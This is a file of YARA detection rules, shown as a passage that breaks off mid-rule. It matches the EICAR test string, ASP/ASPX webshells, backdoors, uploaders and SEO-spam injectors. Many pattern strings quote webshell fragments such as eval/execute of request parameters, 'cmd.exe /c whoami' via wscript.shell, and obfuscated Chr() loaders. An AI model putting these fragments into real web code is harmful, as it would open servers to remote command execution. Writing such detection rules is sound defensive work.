rule eicar_av_test {
    /*
       Per standard, match only if entire file is EICAR string plus optional trailing whitespace.
       The raw EICAR string to be matched is:
       X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
    */

    meta:
        description = "This is a standard AV test, intended to verify that BinaryAlert is working correctly."
        author = "Austin Byers | Airbnb CSIRT"
        reference = "http://www.eicar.org/86-0-Intended-use.html"

    strings:
        $eicar_regex = /^X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H\+H\*\s*$/

    condition:
        all of them
}

rule eicar_substring_test {
    /*
       More generic - match just the embedded EICAR string (e.g. in packed executables, PDFs, etc)
    */

    meta:
        description = "Standard AV test, checking for an EICAR substring"
        author = "Austin Byers | Airbnb CSIRT"

    strings:
        $eicar_substring = "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"

    condition:
        all of them
}

private rule PR00001 : trigger
{
    strings:
        $ps0 = "<%"
    condition:
        $ps0
}

private rule PR00002 : trigger
{
    strings:
        $ps0 = "<title>.:"
    condition:
        $ps0
}

rule asp_backdoor_3FEShell_001 : backdoor
{
    strings:
        $trigger = "3FEShell"
    condition:
        $trigger and PR00001 and PR00002
}

private rule PR00003 : trigger
{
    strings:
        $ps0 = "=\"AspRootkit 1.0 by BloodSword"
    condition:
        $ps0
}

rule asp_backdoor_AspRootkit_001 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00003
}

rule asp_backdoor_aspshell_001 : backdoor
{
    strings:
        $trigger = ">.:: kabuss EC Asp shell"
    condition:
        $trigger
}

rule asp_backdoor_aspshell_002 : backdoor
{
    strings:
        $trigger = "case\"hiddenshell\":hiddenshell()"
    condition:
        $trigger
}

private rule PR00004 : trigger
{
    strings:
        $ps0 = "Response.Write(\"bhssokbhss\");"
    condition:
        $ps0
}

rule asp_backdoor_aspshell_003 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00004
}

private rule PR00005 : trigger
{
    strings:
        $ps0 = "XBCode=\"97a103a101a110"
    condition:
        $ps0
}

rule asp_backdoor_aspshell_003_02 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00005
}

private rule PR00006 : trigger
{
    strings:
        $ps0 = "&copy;CopyLeft 2006. Coded By rssn, Hebust."
    condition:
        $ps0
}

rule asp_backdoor_aspshell_004 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00006
}

private rule PR00007 : trigger
{
    strings:
        $ps0 = "stm.SaveToFile server.MapPath(\"/\"&cachefile&downfilename)"
    condition:
        $ps0
}

rule asp_backdoor_aspshell_005 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00007
}

private rule PR00008 : trigger
{
    strings:
        $ps0 = "For iEn=0 To UBound(Daimaa)"
    condition:
        $ps0
}

rule asp_backdoor_aspshell_006 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00008
}

rule asp_backdoor_aspshell_007 : backdoor
{
    strings:
        $trigger = "?action=goto&scr=#deletedir#\" style=\"color: rgb(255, 0, 0);\"><u> <- DeleteDir"
    condition:
        $trigger
}

private rule PR00009 : trigger
{
    strings:
        $ps0 = "UserPass"
    condition:
        $ps0
}

private rule PR00010 : trigger
{
    strings:
        $ps0 = "SFlag"
    condition:
        $ps0
}

rule asp_backdoor_aspshell_008 : backdoor
{
    strings:
        $trigger = "ShellName"
    condition:
        $trigger and PR00009 and PR00010
}

rule asp_backdoor_aspshell_009 : backdoor
{
    strings:
        $trigger = "SeRvEr AccEss d00r ]--</title>"
    condition:
        $trigger and PR00001
}

rule asp_backdoor_aspshell_010 : backdoor
{
    strings:
        $trigger = "<title>KACAK Shell<"
    condition:
        $trigger
}

private rule PR00011 : trigger
{
    strings:
        $ps0 = ">Add xp_cmdshell(SQL2005)<"
    condition:
        $ps0
}

rule asp_backdoor_ASPXSpy_001 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00011
}

private rule PR00012 : trigger
{
    strings:
        $ps0 = "htmls=chr(60)&chr(37)&\"eval request(\"&chr(34)&\""
    condition:
        $ps0
}

rule asp_backdoor_backdoor_installer_001 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00012
}

private rule PR00013 : trigger
{
    strings:
        $ps0 = "hell"
    condition:
        $ps0
}

rule asp_backdoor_commandexecuter_001 : backdoor
{
    strings:
        $trigger = "COMMAND EXECUTER (CODED BY NEO)"
    condition:
        $trigger and PR00013
}

rule asp_backdoor_commandexecuter_001_001 : backdoor
{
    strings:
        $trigger = "$_file ->Run('cmd.exe /c'.$post.' > '.dirname($_SERVER[SCRIPT_FILENAME]).'/'.$file.'');"
    condition:
        $trigger and PR00013
}

rule asp_backdoor_cooldiyer_001 : backdoor
{
    strings:
        $trigger = "[CoolDiyer@<%=Request"
    condition:
        $trigger and PR00013
}

rule asp_backdoor_cooldiyer_001_001 : backdoor
{
    strings:
        $trigger = "?Action=ScanDrive&Drive=<%=DriveB.DriveLetter%"
    condition:
        $trigger and PR00013
}

rule asp_backdoor_eval_Request_001 : backdoor
{
    strings:
        $trigger = "Dim InValue:InValue=Request(ConKey)"
    condition:
        $trigger and PR00001
}

rule asp_backdoor_eval_Request_002 : backdoor
{
    strings:
        $trigger = "Response.write CreateObject(\"wscript.shell\").exec(\"cmd.exe /c whoami\").StdOut.ReadAll%>"
    condition:
        $trigger
}

rule asp_backdoor_eval_Request_003 : backdoor
{
    strings:
        $trigger = "<%response.write(now):eval(request("
    condition:
        $trigger
}

rule asp_backdoor_eval_Request_004 : backdoor
{
    strings:
        $trigger = "(\"autoshell\"):"
    condition:
        $trigger
}

rule asp_backdoor_eval_Request_006 : backdoor
{
    strings:
        $trigger = "Request[\"\\x61\\x62\\x63\\x64\"];eval"
    condition:
        $trigger and PR00001
}

private rule PR00014 : trigger
{
    strings:
        $ps0 = "request(\""
    condition:
        $ps0
}

rule asp_backdoor_eval_Request_007 : backdoor
{
    strings:
        $trigger = "eval(play)"
    condition:
        $trigger and PR00001 and PR00014
}

private rule PR00015 : trigger
{
    strings:
        $ps0 = "=Server.CreateObject(\"Scrip\"&"
    condition:
        $ps0
}

rule asp_backdoor_eval_Request_008 : backdoor
{
    strings:
        $trigger = "request(\""
    condition:
        $trigger and PR00015 and PR00001
}

private rule PR00016 : trigger
{
    strings:
        $ps0 = "(tseuqer lave\")"
    condition:
        $ps0
}

rule asp_backdoor_eval_Request_009 : backdoor
{
    strings:
        $trigger = "(Replace(StrReverse("
    condition:
        $trigger and PR00016 and PR00001
}

rule asp_backdoor_eval_Request_010 : backdoor
{
    strings:
        $trigger = "<%eval\"\"&(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\""
    condition:
        $trigger
}

private rule PR00017 : trigger
{
    strings:
        $ps0 = "strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0)"
    condition:
        $ps0
}

rule asp_backdoor_eval_Request_011 : backdoor
{
    strings:
        $trigger = "void EvalRequest(string action)"
    condition:
        $trigger and PR00017
}

private rule PR00018 : trigger
{
    strings:
        $ps0 = "Execute(chopper)"
    condition:
        $ps0
}

rule asp_backdoor_execute_004 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00018
}

private rule PR00019 : trigger
{
    strings:
        $ps0 = "re= request(\"a\")"
    condition:
        $ps0
}

private rule PR00020 : trigger
{
    strings:
        $ps0 = "execute re"
    condition:
        $ps0
}

rule asp_backdoor_execute_005 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00019 and PR00020
}

private rule PR00021 : trigger
{
    strings:
        $ps0 = "<script runat=\"server\""
    condition:
        $ps0
}

rule asp_backdoor_execute_006 : backdoor
{
    strings:
        $trigger = "Sub RunPOP3Brute(ByVal"
    condition:
        $trigger and PR00021 and PR00001
}

rule asp_backdoor_execute_request_001 : backdoor
{
    strings:
        $trigger = "<%execute(request(\""
    condition:
        $trigger
}

rule asp_backdoor_filesman_001 : backdoor
{
    strings:
        $trigger = "GetFiles_Dirs(base64Decode(args)"
    condition:
        $trigger and PR00021 and PR00001
}

private rule PR00022 : trigger
{
    strings:
        $ps0 = "154%171%150%161%85%167%154%166%170%154%168%169%93%87%103%101%103%101%87%94"
    condition:
        $ps0
}

rule asp_backdoor_generic_002 : backdoor
{
    strings:
        $trigger = "EXecutE("
    condition:
        $trigger and PR00001 and PR00022
}

private rule PR00023 : trigger
{
    strings:
        $ps0 = "KSIuoUHMmBFpkWcPqfVvlxnErCyNTLDRZGJagsjwAbzedQtOhXiY"
    condition:
        $ps0
}

rule asp_backdoor_generic_003 : backdoor
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR00001 and PR00023
}

private rule PR00024 : trigger
{
    strings:
        $ps0 = "\\x78\"+\"\\x5F\"+\"\\x62\\x65\"+\"\\x73\"+\"\\x74\\x5F\"+\"\\x39\\x31\\x31"
    condition:
        $ps0
}

rule asp_backdoor_generic_004 : backdoor
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR00001 and PR00024
}

private rule PR00025 : trigger
{
    strings:
        $ps0 = "\\x4E\"+\"\\x45\"+\"\\x50"
    condition:
        $ps0
}

rule asp_backdoor_generic_005 : backdoor
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR00001 and PR00025
}

rule asp_backdoor_generic_006 : backdoor
{
    strings:
        $trigger = "eval(request(Chr(74)&Chr(105)"
    condition:
        $trigger and PR00001
}

private rule PR00026 : trigger
{
    strings:
        $ps0 = "shell"
    condition:
        $ps0
}

rule asp_backdoor_InsomniaShell_001 : backdoor
{
    strings:
        $trigger = "sb.Append(\"Impersonation - Identification\");"
    condition:
        $trigger and PR00026 and PR00001
}

private rule PR00027 : trigger
{
    strings:
        $ps0 = "popup(popup(System.Text.Encoding.Default.GetString"
    condition:
        $ps0
}

rule asp_backdoor_jspopup_001_01 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00021 and PR00027
}

private rule PR00028 : trigger
{
    strings:
        $ps0 = "Coded By Pejvak"
    condition:
        $ps0
}

rule asp_backdoor_pejvak_001 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00028
}

private rule PR00029 : trigger
{
    strings:
        $ps0 = "eva"
    condition:
        $ps0
}

rule asp_backdoor_request_002 : backdoor
{
    strings:
        $trigger = "Request[\"\\x78"
    condition:
        $trigger and PR00029
}

private rule PR00030 : trigger
{
    strings:
        $ps0 = "<title>Small System</title>"
    condition:
        $ps0
}

rule asp_backdoor_smallsystem_001 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00030
}

rule asp_backdoor_umer_001 : backdoor
{
    strings:
        $trigger = "Umer Rock's ASP SHELL"
    condition:
        $trigger and PR00013
}

rule asp_backdoor_umer_001_001 : backdoor
{
    strings:
        $trigger = "?raiz=root\">DRIVES</a> ::."
    condition:
        $trigger and PR00013
}

private rule PR00031 : trigger
{
    strings:
        $ps0 = "Dim action,password,pathname,pathname2,keywordindex"
    condition:
        $ps0
}

rule asp_backdoor_uploader_001 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00031
}

private rule PR00032 : trigger
{
    strings:
        $ps0 = "sys_password=\""
    condition:
        $ps0
}

rule asp_backdoor_uploader_002 : backdoor
{
    strings:
        $trigger = ".SaveToFile"
    condition:
        $trigger and PR00001 and PR00032
}

rule asp_backdoor_uploader_003 : backdoor
{
    strings:
        $trigger = "dim upload,file,formName,formPath,iCount,upfileName,nowTime"
    condition:
        $trigger and PR00001
}

rule asp_backdoor_uploader_006 : backdoor
{
    strings:
        $trigger = "if request(\"password\") <> \"yt\" Then"
    condition:
        $trigger and PR00001
}

private rule PR00033 : trigger
{
    strings:
        $ps0 = "response.write(\"uploaded\")"
    condition:
        $ps0
}

rule asp_backdoor_uploader_007 : backdoor
{
    strings:
        $trigger = "dim password,action,filename,filepath,body"
    condition:
        $trigger and PR00033
}

rule asp_backdoor_uploader_008 : backdoor
{
    strings:
        $trigger = "<title>|[NTDaddy"
    condition:
        $trigger
}

rule asp_backdoor_uploader_009 : backdoor
{
    strings:
        $trigger = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>"
    condition:
        $trigger
}

rule asp_backdoor_uploader_010 : backdoor
{
    strings:
        $trigger = "<title>Aventis KlasVayv"
    condition:
        $trigger
}

rule asp_backdoor_uploader_012 : backdoor
{
    strings:
        $trigger = "<title>Remote Explorer</title>"
    condition:
        $trigger
}

private rule PR00034 : trigger
{
    strings:
        $ps0 = "Server.CreateObject("
    condition:
        $ps0
}

private rule PR00035 : trigger
{
    strings:
        $ps0 = "Dim"
    condition:
        $ps0
}

rule asp_backdoor_uploader_013 : backdoor
{
    strings:
        $trigger = "freeaspupload"
    condition:
        $trigger and PR00034 and PR00035 and PR00001
}

private rule PR00036 : trigger
{
    strings:
        $ps0 = "System.IO.Path.GetExtension(fileName);"
    condition:
        $ps0
}

rule asp_backdoor_uploader_014 : backdoor
{
    strings:
        $trigger = "Server.HtmlEncode(FileUpload1.FileName);"
    condition:
        $trigger and PR00021 and PR00036 and PR00001
}

private rule PR00037 : trigger
{
    strings:
        $ps0 = ".SaveAs(Server.MapPath"
    condition:
        $ps0
}

rule asp_backdoor_uploader_015 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00021 and PR00037
}

rule asp_backdoor_uploader_016 : backdoor
{
    strings:
        $trigger = "<TITLE>Expdoor"
    condition:
        $trigger and PR00001 and PR00014
}

private rule PR00038 : trigger
{
    strings:
        $ps0 = "new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile"
    condition:
        $ps0
}

rule asp_backdoor_uploader_017 : backdoor
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00021 and PR00038
}

rule asp_backdoor_WanExplorer_001 : backdoor
{
    strings:
        $trigger = "SysName=\"WanExplorer\""
    condition:
        $trigger and PR00001
}

private rule PR00039 : trigger
{
    strings:
        $ps0 = "action"
    condition:
        $ps0
}

rule asp_backdoor_webshell_001 : backdoor
{
    strings:
        $trigger = "html_title = shell_fake_name"
    condition:
        $trigger and PR00039
}

private rule PR00040 : trigger
{
    strings:
        $ps0 = "<%-- ASPX Shell"
    condition:
        $ps0
}

rule asp_backdoor_webshell_002 : backdoor
{
    strings:
        $trigger = "GIF8"
    condition:
        $trigger and PR00040
}

private rule PR00041 : trigger
{
    strings:
        $ps0 = "oProcess.BuildUploadRequest"
    condition:
        $ps0
}

rule asp_backdoor_webshell_003 : backdoor
{
    strings:
        $trigger = "ubound(uploadrequest.item(key).keys)"
    condition:
        $trigger and PR00034 and PR00035 and PR00001 and PR00041
}

private rule PR00042 : trigger
{
    strings:
        $ps0 = "<title"
    condition:
        $ps0
}

private rule PR00043 : trigger
{
    strings:
        $ps0 = "DataColumn dcFileDownload = new DataColumn(\"Download\");"
    condition:
        $ps0
}

private rule PR00044 : trigger
{
    strings:
        $ps0 = "Microsoft"
    condition:
        $ps0
}

rule asp_backdoor_webshell_004 : backdoor
{
    strings:
        $trigger = "sinf.UseShellExecute = false;"
    condition:
        $trigger and PR00042 and PR00043 and PR00044
}

private rule PR00045 : trigger
{
    strings:
        $ps0 = "File.Delete(Request.QueryString[\"del\"]);"
    condition:
        $ps0
}

private rule PR00046 : trigger
{
    strings:
        $ps0 = "<form"
    condition:
        $ps0
}

rule asp_backdoor_webshell_005 : backdoor
{
    strings:
        $trigger = "outstr += string.Format(\"<a href='?fdir={0}'>{1}/</a>"
    condition:
        $trigger and PR00042 and PR00045 and PR00046
}

private rule PR00047 : trigger
{
    strings:
        $ps0 = "thisDir = getCommandOutput(\"cmd /c\" & szCMD)"
    condition:
        $ps0
}

rule asp_backdoor_webshell_006 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00047 and PR00013
}

private rule PR00048 : trigger
{
    strings:
        $ps0 = "zehir"
    condition:
        $ps0
}

rule asp_backdoor_zehir_001 : backdoor
{
    strings:
        $trigger = "objFSO.CreateTextFile"
    condition:
        $trigger and PR00048 and PR00001
}

private rule PR00049 : trigger
{
    strings:
        $ps0 = "GIF8"
    condition:
        $ps0
}

rule asp_backdoor_zehir_002 : backdoor
{
    strings:
        $trigger = "&drive_.DriveLetter&"
    condition:
        $trigger and PR00049
}

private rule PR00050 : trigger
{
    strings:
        $ps0 = "<script"
    condition:
        $ps0
}

rule asp_hacktool_portforward_001 : hacktool
{
    strings:
        $trigger = ".Start(remoteip,int.Parse(remoteport),localip,int.Parse(localport));"
    condition:
        $trigger and PR00050
}

private rule PR00051 : trigger
{
    strings:
        $ps0 = "set Http=server.createobject(\"MSXML2.XMLHTTP\")"
    condition:
        $ps0
}

private rule PR00052 : trigger
{
    strings:
        $ps0 = "if GetBot=\"baidu\" or GetBot=\"google\" or GetBot=\"Yahoo\" or GetBot=\"MSN\" or  GetBot=\"Sohu\" or GetBot=\"114\" or GetBot=\"sogou\" or GetBot=\"soso\"  then"
    condition:
        $ps0
}

private rule PR00053 : trigger
{
    strings:
        $ps0 = "(Request.ServerVariables(\"HTTP_REFERER\"))"
    condition:
        $ps0
}

rule asp_malware_seospam_001 : malware
{
    strings:
        $trigger = "<script language=\"vbscript\" runat=\"server\">"
    condition:
        $trigger and PR00051 and PR00052 and PR00053
}

rule asp_malware_seospam_002 : malware
{
    strings:
        $trigger = "string spider_flag = \"google|"
    condition:
        $trigger and PR00021 and PR00001
}

private rule PR00054 : trigger
{
    strings:
        $ps0 = ".replace("
    condition:
        $ps0
}

private rule PR00055 : trigger
{
    strings:
        $ps0 = "zone-h.gif"
    condition:
        $ps0
}

private rule PR00056 : trigger
{
    strings:
        $ps0 = "document.write("
    condition:
        $ps0
}

rule asp_malware_win32_trojan_001 : malware
{
    strings:
        $trigger = "\\Wds\\rdpwd\\Tds\\tcp\\PortNumber"
    condition:
        $trigger and PR00050 and PR00054 and PR00055 and PR00056
}

rule asp_spamseo_aQ0O010O_001 : spamseo
{
    strings:
        $trigger = "\"User-Agent\",\"aQ0O010O\""
    condition:
        $trigger
}

rule asp_spamseo_aQ0O010O_002 : spamseo
{
    strings:
        $trigger = "\"User-Agent\", \"aQ0O010O\""
    condition:
        $trigger
}

rule asp_spamseo_doorway_001 : spamseo
{
    strings:
        $trigger = "title='\"&temp_title(0)&\"'><img border='0' src='https://www.google.com/images/logos/google_logo_41"
    condition:
        $trigger and PR00034 and PR00035 and PR00001
}

private rule PR00057 : trigger
{
    strings:
        $ps0 = "response.write"
    condition:
        $ps0
}

rule asp_spamseo_doorway_002 : spamseo
{
    strings:
        $trigger = "Content_mb=GetHtml(Remote_server&\"/index.asp\"&"
    condition:
        $trigger and PR00057
}

rule asp_spamseo_doorway_003 : spamseo
{
    strings:
        $trigger = "document.getElementById('linkbyme').style.display='none';"
    condition:
        $trigger and PR00001 and PR00014
}

private rule PR00058 : trigger
{
    strings:
        $ps0 = "yumingid"
    condition:
        $ps0
}

rule asp_spamseo_doorway_004 : spamseo
{
    strings:
        $trigger = "request(\""
    condition:
        $trigger and PR00058 and PR00001
}

private rule PR00059 : trigger
{
    strings:
        $ps0 = "Response.Write strHtml"
    condition:
        $ps0
}

private rule PR00060 : trigger
{
    strings:
        $ps0 = "Function GetHTTPPage(url)"
    condition:
        $ps0
}

rule asp_spamseo_generic_001 : spamseo
{
    strings:
        $trigger = "array(\"google\",\"yahoo\",\"bing\",\"aol"
    condition:
        $trigger and PR00059 and PR00034 and PR00001 and PR00060
}

private rule PR00061 : trigger
{
    strings:
        $ps0 = "GetHtml(Remote_file)"
    condition:
        $ps0
}

rule asp_spamseo_generic_002 : spamseo
{
    strings:
        $trigger = "Remote_file = Remote_server"
    condition:
        $trigger and PR00061 and PR00057
}

rule asp_spamseo_injector_001 : spamseo
{
    strings:
        $trigger = "dim O0Oo000OO0O0,O0O000OO0O0,O00O000OO0O0"
    condition:
        $trigger and PR00001
}

private rule PR00062 : trigger
{
    strings:
        $ps0 = "Execute(OOOO(OOO))"
    condition:
        $ps0
}

rule asp_spamseo_injector_002 : spamseo
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00062
}

rule asp_spamseo_injector_003 : spamseo
{
    strings:
        $trigger = "(\"k9E>=mk9625mkE:E=6mc_c ,}@E"
    condition:
        $trigger and PR00001
}

rule asp_spamseo_injector_004 : spamseo
{
    strings:
        $trigger = "=\"&Request.ServerVariables(\"REMOTE_ADDR\")&\"&shell=\"&Request.ServerVariables(\"SERVER_NAME\"))"
    condition:
        $trigger and PR00001
}

rule asp_spamseo_injector_005 : spamseo
{
    strings:
        $trigger = "Server.CreateObject ( Chr ( 97 ) & Chr ( 100 ) & Chr ( 111 ) & Chr ( 100 ) & Chr ( 98 ) & Chr ( 46 ) & Chr ( 115 ) & Chr ( 116 ) & Chr ( 114 )"
    condition:
        $trigger
}

rule asp_spamseo_injector_007 : spamseo
{
    strings:
        $trigger = "= Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr"
    condition:
        $trigger
}

rule asp_spamseo_injector_008 : spamseo
{
    strings:
        $trigger = "response.write GetResStr(\"http://"
    condition:
        $trigger
}

rule asp_spamseo_injector_009 : spamseo
{
    strings:
        $trigger = ", Chr(37) & ChrW(-243) & Chr(62), Chr(37) & Chr(62))"
    condition:
        $trigger
}

rule asp_spamseo_injector_010 : spamseo
{
    strings:
        $trigger = "infile1 = mydir&\"index.html\""
    condition:
        $trigger
}

rule asp_spamseo_injector_011 : spamseo
{
    strings:
        $trigger = "content=ReplaceReg(content,\"<a [.>]*href=\"\"\"&purl&"
    condition:
        $trigger
}

rule asp_spamseo_injector_012 : spamseo
{
    strings:
        $trigger = "dim god, faith, holy, pray, amen, Christz"
    condition:
        $trigger
}

private rule PR00063 : trigger
{
    strings:
        $ps0 = "execute(\"Function AscDecrypt(AE9):AE9 = Replace(AE9,\"\"u\"\",\"\"-\"\"):EncodeArr"
    condition:
        $ps0
}

rule asp_spamseo_injector_013 : spamseo
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00063
}

private rule PR00064 : trigger
{
    strings:
        $ps0 = "string mydomain"
    condition:
        $ps0
}

rule asp_spamseo_injector_014 : spamseo
{
    strings:
        $trigger = "string[] spider_flag_arr = spider_flag.Split('|');"
    condition:
        $trigger and PR00064
}

private rule PR00065 : trigger
{
    strings:
        $ps0 = "response.clear:response.charset"
    condition:
        $ps0
}

rule asp_spamseo_injector_015 : spamseo
{
    strings:
        $trigger = ".GetSpecialFolder("
    condition:
        $trigger and PR00065 and PR00057
}

private rule PR00066 : trigger
{
    strings:
        $ps0 = "url = clone_url&QUERYSTRING"
    condition:
        $ps0
}

rule asp_spamseo_injector_016 : spamseo
{
    strings:
        $trigger = ".SaveToFile"
    condition:
        $trigger and PR00001 and PR00066
}

private rule PR00067 : trigger
{
    strings:
        $ps0 = "Google Web Preview|bot|spider|wget"
    condition:
        $ps0
}

rule asp_spamseo_injector_017 : spamseo
{
    strings:
        $trigger = "Set http = Nothing"
    condition:
        $trigger and PR00067 and PR00001
}

private rule PR00068 : trigger
{
    strings:
        $ps0 = "if regexn.test(request.ServerVariables(\"HTTP_USER_AGENT\")) then"
    condition:
        $ps0
}

rule asp_spamseo_injector_018 : spamseo
{
    strings:
        $trigger = "regexn.pattern = \"Google Web Preview|google|yahoo|msnbot\""
    condition:
        $trigger and PR00068 and PR00001
}

private rule PR00069 : trigger
{
    strings:
        $ps0 = "sourceBody=GetResStr(siteUrl&\"/\"&queryStr)"
    condition:
        $ps0
}

rule asp_spamseo_injector_019 : spamseo
{
    strings:
        $trigger = "request(\""
    condition:
        $trigger and PR00069 and PR00001
}

private rule PR00070 : trigger
{
    strings:
        $ps0 = "file_get_c"
    condition:
        $ps0
}

private rule PR00071 : trigger
{
    strings:
        $ps0 = "first=first&\"if instr(1,s_agent,\"\"googlebot"
    condition:
        $ps0
}

rule asp_spamseo_injector_020 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR00070 and PR00071
}

private rule PR00072 : trigger
{
    strings:
        $ps0 = "execute body"
    condition:
        $ps0
}

rule asp_spamseo_injector_gen_003 : spamseo
{
    strings:
        $trigger = "Public Function GetHtml(url)"
    condition:
        $trigger and PR00034 and PR00001 and PR00072
}

private rule PR00073 : trigger
{
    strings:
        $ps0 = "body=GetHtml"
    condition:
        $ps0
}

rule asp_spamseo_injector_gen_003_02 : spamseo
{
    strings:
        $trigger = "execute body"
    condition:
        $trigger and PR00034 and PR00073 and PR00001
}

private rule PR00074 : trigger
{
    strings:
        $ps0 = "Server.ScriptTimeout="
    condition:
        $ps0
}

rule asp_spamseo_injector_gen_003_03 : spamseo
{
    strings:
        $trigger = "execute body"
    condition:
        $trigger and PR00034 and PR00074 and PR00001
}

private rule PR00075 : trigger
{
    strings:
        $ps0 = "new AjaxControlToo1kit.Ajax("
    condition:
        $ps0
}

rule asp_spamseo_injector_gen_005 : spamseo
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR00021 and PR00075
}

rule asp_spamseo_redirect_001 : spamseo
{
    strings:
        $trigger = "response.write htmls"
    condition:
        $trigger
}

private rule PR00076 : trigger
{
    strings:
        $ps0 = "let_301 = getHTTPPage(Replace(\"http"
    condition:
        $ps0
}

rule asp_spamseo_redirect_002 : spamseo
{
    strings:
        $trigger = "If instr(zhizhu,\"google\")>0 Or instr(zhizhu,\"yahoo\")>0"
    condition:
        $trigger and PR00076
}

private rule PR00077 : trigger
{
    strings:
        $ps0 = "response.write jumpcode"
    condition:
        $ps0
}

rule asp_spamseo_redirect_002_03 : spamseo
{
    strings:
        $trigger = "If instr(zhizhu,\"google\")>0 Or instr(zhizhu,\"yahoo\")>0"
    condition:
        $trigger and PR00077
}

private rule PR00078 : trigger
{
    strings:
        $ps0 = "If instr(zhizhu,\"google\")>0 Or instr(zhizhu,\"yahoo\")>0"
    condition:
        $ps0
}

rule asp_spamseo_redirect_002_04 : spamseo
{
    strings:
        $trigger = "htmls = getHTTPPage(\""
    condition:
        $trigger and PR00078
}

rule asp_spamseo_redirect_004 : spamseo
{
    strings:
        $trigger = "<cfif (Find( \"google\", REQUEST.UserAgent ) or Find( \"yahoo"
    condition:
        $trigger
}

private rule PR00079 : trigger
{
    strings:
        $ps0 = "s_agent,\"googlebot\",1)"
    condition:
        $ps0
}

rule asp_spamseo_redirect_005 : spamseo
{
    strings:
        $trigger = "function Getbot()"
    condition:
        $trigger and PR00001 and PR00079
}

private rule PR00080 : trigger
{
    strings:
        $ps0 = "ahoo"
    condition:
        $ps0
}

private rule PR00081 : trigger
{
    strings:
        $ps0 = "response.write(\"<!DOCTYPE html><html><body><script>document.location=(\"\"\"&DataCenterURL"
    condition:
        $ps0
}

rule asp_spamseo_redirect_007 : spamseo
{
    strings:
        $trigger = "ses=split(\"google,bing"
    condition:
        $trigger and PR00080 and PR00081
}

rule asp_spamseo_redirect_008 : spamseo
{
    strings:
        $trigger = "bodyContext = replace(bodyContext, REDIRECT_DOMAIN, REDIRECT_MAIN_PATH)"
    condition:
        $trigger and PR00001
}

private rule PR00082 : trigger
{
    strings:
        $ps0 = "Request.ServerVariables(\"HTTP_USER_AGENT"
    condition:
        $ps0
}

rule asp_spamseo_redirect_009 : spamseo
{
    strings:
        $trigger = "response.write jumpcode"
    condition:
        $trigger and PR00034 and PR00082 and PR00001
}

private rule PR00083 : trigger
{
    strings:
        $ps0 = "if (domain.IndexOf(\"google\") == -1 && domain.IndexOf(\"msn.com"
    condition:
        $ps0
}

rule asp_spamseo_redirect_010 : spamseo
{
    strings:
        $trigger = "content = webclient.DownloadString(URL);"
    condition:
        $trigger and PR00050 and PR00083
}

private rule PR00084 : trigger
{
    strings:
        $ps0 = ".Contains(\"exec\") ||"
    condition:
        $ps0
}

private rule PR00085 : trigger
{
    strings:
        $ps0 = "string redirect_url"
    condition:
        $ps0
}

private rule PR00086 : trigger
{
    strings:
        $ps0 = "HttpContext.Current.Response.Redirect(redirect_url, true);"
    condition:
        $ps0
}

rule asp_spamseo_redirect_011 : spamseo
{
    strings:
        $trigger = "string[] spider_flag_arr = spider_flag.Split('|');"
    condition:
        $trigger and PR00084 and PR00050 and PR00085 and PR00086
}

private rule PR00087 : trigger
{
    strings:
        $ps0 = "var HOST = extools.GetSiteAddress"
    condition:
        $ps0
}

rule asp_spamseo_redirect_011_02 : spamseo
{
    strings:
        $trigger = "string[] spider_flag_arr = spider_flag.Split('|');"
    condition:
        $trigger and PR00087 and PR00084 and PR00050 and PR00086
}

rule asp_spamseo_redirect_011_03 : spamseo
{
    strings:
        $trigger = "string[] spider_flag_arr = spider_flag.Split('|');"
    condition:
        $trigger and PR00084 and PR00050 and PR00086
}

rule asp_spamseo_redirect_gen_001 : spamseo
{
    strings:
        $trigger = "\"h\"&\"t\"&\"t\"&\"p\"&\":\"&\"/\"&\"/\"&\""
    condition:
        $trigger and PR00034 and PR00082 and PR00001
}

private rule PR00088 : trigger
{
    strings:
        $ps0 = "_USER_AGENT}\" pattern=\"(bing"
    condition:
        $ps0
}

private rule PR00089 : trigger
{
    strings:
        $ps0 = "aol)\" ignoreCase=\"true"
    condition:
        $ps0
}

private rule PR00090 : trigger
{
    strings:
        $ps0 = "action type=\"Rewrite\" url="
    condition:
        $ps0
}

rule asp_spamseo_web_configredirect_001 : spamseo
{
    strings:
        $trigger = "add input=\"{"
    condition:
